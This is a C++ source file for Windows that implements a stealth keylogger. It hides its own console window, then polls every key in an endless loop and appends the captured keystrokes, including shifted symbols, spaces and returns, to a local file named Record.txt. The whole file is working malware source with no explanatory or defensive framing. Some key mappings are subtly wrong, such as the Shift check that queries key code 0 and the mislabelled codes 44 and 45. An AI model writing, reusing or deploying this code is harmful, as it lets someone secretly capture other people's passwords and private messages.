#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;
void hide();
void log();
int main(int argc, char const *argv[])
{
    hide();
    log();
    return 0;
}
void hide(){
    HWND stealth ;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass" , NULL);
    ShowWindow(stealth,0);
}
void log()
{
    char key;
    for (;;)
    {
        for (key = 8; key <= 222; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                ofstream hout("Record.txt", ios::app);
                if ((key > 64) && (key < 91) &&!(GetAsyncKeyState(0 * 10)))
                {
                    key += 32;
                    hout << key;
                    hout.close();
                    break;
                }
                else if ((key > 64) && (key < 91))
                {
                    hout << key;
                    hout.close();
                    break;
                }
                else
                {
                    switch (key)
                    {
                    case 49:
                        if (GetAsyncKeyState(0 * 10))
                        {
                            hout << "!";
                        }
                        else
                            hout << "1";
                        break;
                    case 48:
                        if (GetAsyncKeyState(0 * 10))
                        {
                            hout << ")";
                        }
                        else
                            hout << "0";
                        break;
                    case 50:
                        if (GetAsyncKeyState(0 * 10))
                        {
                            hout << "@";
                        }
                        else
                            hout << "2";
                        break;
                    case 51:
                        if (GetAsyncKeyState(0 * 10))
                        {
                            hout << "#";
                        }
                        else
                            hout << "3";
                        break;
                    case 52:
                        if (GetAsyncKeyState(0 * 10))
                        {
                            hout << "$";
                        }
                        else
                            hout << "4";
                        break;
                    case 53:
                        if (GetAsyncKeyState(0 * 10))
                        {
                            hout << "%";
                        }
                        else
                            hout << "5";
                        break;
                    case 54:
                        if (GetAsyncKeyState(0 * 10))
                        {
                            hout << "^";
                        }
                        else
                            hout << "6";
                        break;
                    case 55:
                        if (GetAsyncKeyState(0 * 10))
                        {
                            hout << "&";
                        }
                        else
                            hout << "7";
                        break;
                    case 56:
                        if (GetAsyncKeyState(0 * 10))
                        {
                            hout << "*";
                        }
                        else
                            hout << "8";
                        break;
                    case 57:
                        if (GetAsyncKeyState(0 * 10))
                        {
                            hout << "(";
                        }
                        else
                            hout << "9";
                        break;
                    case VK_SPACE:
                        hout << " ";
                        break;
                    case VK_RETURN:
                        hout << "\n";
                        break;
                    case VK_TAB:
                        hout << "        ";
                        break;
                    case VK_BACK:
                        hout << "<BackSpace>";
                        break;
                    case VK_ESCAPE:
                        hout << "<Esc>";
                        break;
                    case VK_DELETE:
                        hout << "<Delete";
                        break;
                    case 44:
                        if (GetAsyncKeyState(0 * 10))
                        {
                            hout << "<";
                        }
                        else
                            hout << ",";
                        break;
                    case 45:
                        if (GetAsyncKeyState(0 * 10))
                        {
                            hout << "_";
                        }
                        else
                            hout << "-";
                        break;
                    }
                    break;
                }
            }
        }
    }
}
